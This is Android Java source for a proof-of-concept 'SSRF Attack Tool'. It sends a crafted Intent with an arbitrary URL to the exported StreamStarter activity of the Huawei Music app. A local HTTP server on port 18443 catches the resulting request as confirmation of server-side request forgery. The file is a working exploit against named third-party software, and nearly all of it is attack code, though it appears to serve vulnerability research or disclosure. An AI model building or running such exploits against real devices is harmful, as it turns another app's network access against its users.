package com.test.ssrf;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {
    private EditText editTextUrl;
    private TextView statusText;
    private TextView logText;
    private Handler handler;
    private ServerSocket serverSocket;
    private int serverPort = 18443;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        editTextUrl = findViewById(R.id.editTextUrl);
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        logText.setMovementMethod(new ScrollingMovementMethod());
        handler = new Handler(Looper.getMainLooper());

        Button btnAttack = findViewById(R.id.btnAttack);

        log("SSRF Attack Tool Ready");
        log("Start local server to catch SSRF request...");
        startServer();

        editTextUrl.setText("http://127.0.0.1:" + serverPort + "/ssrf_target");

        btnAttack.setOnClickListener(v -> {
            String url = editTextUrl.getText().toString().trim();
            if (!url.isEmpty()) triggerStreamStarter(url);
            else Toast.makeText(this, "Please enter a URL", Toast.LENGTH_SHORT).show();
        });
    }

    private void startServer() {
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(serverPort);
                log("Local HTTP server started on port " + serverPort);
                log("Waiting for Huawei Music to connect...");
                while (!serverSocket.isClosed()) {
                    Socket client = serverSocket.accept();
                    handleClient(client);
                }
            } catch (Exception e) {
                log("Server error: " + e.getMessage());
            }
        }).start();
    }

    private void handleClient(Socket client) {
        new Thread(() -> {
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
                StringBuilder req = new StringBuilder();
                String line;
                String userAgent = "";
                while ((line = reader.readLine()) != null && !line.isEmpty()) {
                    req.append(line).append("\n");
                    if (line.startsWith("User-Agent:")) userAgent = line.substring(12).trim();
                }

                String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());

                log("");
                log("******** SSRF REQUEST CAPTURED ********");
                log("Time: " + ts);
                log("From: " + client.getInetAddress().getHostAddress() + ":" + client.getPort());
                log("User-Agent: " + userAgent);
                log("=== Raw HTTP Request ===");
                log(req.toString());
                log("=== SSRF CONFIRMED ✓ ===");
                log("Huawei Music made HTTP GET to our server!");
                log("****************************************");

                setStatus("✓ SSRF 确认！华为音乐向本机 " + serverPort + " 端口发起了 HTTP 请求");
                showToast("SSRF 请求已被捕获！请求来自: " + userAgent);

                // Send minimal response
                String resp = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nOK";
                client.getOutputStream().write(resp.getBytes());
                client.close();
            } catch (Exception e) {
                log("Client handler error: " + e.getMessage());
            }
        }).start();
    }

    private void triggerStreamStarter(String url) {
        log("");
        log("========================================");
        log("[+] Sending Intent to Huawei Music...");
        log("    URL: " + url);

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(url));
        intent.setClassName("com.huawei.music",
            "com.android.mediacenter.ui.player.oneshot.StreamStarter");
        try {
            startActivity(intent);
            log("[+] startActivity() SUCCESS");
            log("[+] Intent delivered. Waiting for HTTP callback...");
            log("========================================");
            setStatus("→ Intent 已发送，等待华为音乐回连...");
        } catch (Exception e) {
            log("[-] FAILED: " + e.getMessage());
            setStatus("✗ 失败: " + e.getClass().getSimpleName());
            showToast("启动失败: " + e.getMessage());
        }
    }

    private void log(String msg) {
        handler.post(() -> {
            logText.append(msg + "\n");
            int lastLineTop = logText.getLayout() != null
                ? logText.getLayout().getLineTop(logText.getLineCount()) : 0;
            int viewHeight = logText.getHeight();
            if (lastLineTop > viewHeight) {
                logText.scrollTo(0, lastLineTop - viewHeight);
            }
        });
    }

    private void setStatus(String msg) {
        handler.post(() -> {
            statusText.setText(msg);
            statusText.setTextColor(msg.startsWith("✓") ? 0xFF00AA00 : msg.startsWith("✗") ? 0xFFCC0000 : 0xFF666600);
        });
    }

    private void showToast(String msg) {
        handler.post(() -> Toast.makeText(this, msg, Toast.LENGTH_LONG).show());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try { serverSocket.close(); } catch (Exception e) {}
    }
}
